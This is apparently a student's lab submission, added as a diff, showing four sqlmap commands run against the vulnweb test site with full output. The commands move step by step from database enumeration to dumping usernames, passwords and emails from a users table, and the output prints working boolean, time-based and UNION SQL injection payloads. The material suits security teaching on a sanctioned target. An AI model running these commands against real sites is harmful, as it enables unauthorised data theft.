@@ -1,0 +1,228 @@
+Name: Muhammad Ahmad
+Roll No: 22-10100
+
+Command 1:
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 –dbs
+Solution:
+──(kali㉿kali)-[~]
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 –dbs
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.7.2#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:19:30 /2023-03-30/
+
+[05:19:31] [INFO] resuming back-end DBMS 'mysql' 
+[05:19:33] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 8616=8616
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8508 FROM (SELECT(SLEEP(5)))GYRT)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-3810 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6e624f7a70726b6f6a4b4f536974754b755a59455362485175417870777a4f664f564a4868645970,0x7176716271)-- -
+---
+[05:19:39] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+[05:19:39] [INFO] fetching database names
+available databases [2]:
+[*] acuart
+[*] information_schema
+
+[05:19:39] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 05:19:39 /2023-03-30/
+
+Command 2:
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart –tables
+Solution:
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart –tables
+        ___
+       __H__                                                                                                                                                                                                       
+ ___ ___[.]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                           
+|_ -| . [']     | .'| . |                                                                                                                                                                                          
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:20:15 /2023-03-30/
+
+[05:20:15] [INFO] resuming back-end DBMS 'mysql' 
+[05:20:15] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 8616=8616
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8508 FROM (SELECT(SLEEP(5)))GYRT)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-3810 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6e624f7a70726b6f6a4b4f536974754b755a59455362485175417870777a4f664f564a4868645970,0x7176716271)-- -
+---
+[05:20:17] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+[05:20:17] [INFO] fetching tables for database: 'acuart'
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+[05:20:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 05:20:17 /2023-03-30/
+
+
+Command 3:
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart -T users -columns
+Solution:
+                                                                                                                                                                                                                   
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart -T users -columns                                
+        ___
+       __H__                                                                                                                                                                                                       
+ ___ ___[)]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                           
+|_ -| . [)]     | .'| . |                                                                                                                                                                                          
+|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:20:44 /2023-03-30/
+
+[05:20:45] [INFO] resuming back-end DBMS 'mysql' 
+[05:20:45] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 8616=8616
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8508 FROM (SELECT(SLEEP(5)))GYRT)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-3810 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6e624f7a70726b6f6a4b4f536974754b755a59455362485175417870777a4f664f564a4868645970,0x7176716271)-- -
+---
+[05:20:46] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: PHP 5.6.40, Nginx 1.19.0
+back-end DBMS: MySQL >= 5.0.12
+[05:20:46] [INFO] fetching columns for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| name    | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+[05:20:46] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 05:20:46 /2023-03-30/
+
+Command 4:
+sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart -T users -columns -C name,uname,pass,email –dump
+Solution:
+┌──(kali㉿kali)-[~]
+└─$ sqlmap -u http://testphp.vulnweb.com/artists.php?artist=3 -D acuart -T users -columns -C name,uname,pass,email –dump
+        ___
+       __H__                                                                                                                                                                                                       
+ ___ ___[,]_____ ___ ___  {1.7.2#stable}                                                                                                                                                                           
+|_ -| . [(]     | .'| . |                                                                                                                                                                                          
+|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                          
+      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                       
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 05:27:00 /2023-03-30/
+
+[05:27:01] [INFO] resuming back-end DBMS 'mysql' 
+[05:27:01] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artist (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artist=1 AND 8616=8616
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: artist=1 AND (SELECT 8508 FROM (SELECT(SLEEP(5)))GYRT)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: artist=-3810 UNION ALL SELECT NULL,NULL,CONCAT(0x717a6b7671,0x6e624f7a70726b6f6a4b4f536974754b755a59455362485175417870777a4f664f564a4868645970,0x7176716271)-- -
+---
+[05:27:02] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.19.0, PHP 5.6.40
+back-end DBMS: MySQL >= 5.0.12
+[05:27:02] [INFO] fetching columns 'email, name, pass, uname' for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[4 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| email  | varchar(100) |
+| name   | varchar(100) |
+| pass   | varchar(100) |
+| uname  | varchar(100) |
++--------+--------------+
+
+[05:27:02] [INFO] fetching entries of column(s) 'email,name,pass,uname' for table 'users' in database 'acuart'
+Database: acuart
+Table: users
+[1 entry]
++--------------------------------------------------------------------------------+-------+------+----------------+
+| name                                                                           | uname | pass | email          |
++--------------------------------------------------------------------------------+-------+------+----------------+
+| pols aagi"OR 1=1 AND IFNULL(ASCII(SUBSTRING((SELECT @@VERSION),1,1)),0)>255--  | test  | test | fuck@email.com |
++--------------------------------------------------------------------------------+-------+------+----------------+
+
+[05:27:02] [INFO] table 'acuart.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com/dump/acuart/users.csv'
+[05:27:02] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/testphp.vulnweb.com'
+
+[*] ending @ 05:27:02 /2023-03-30/
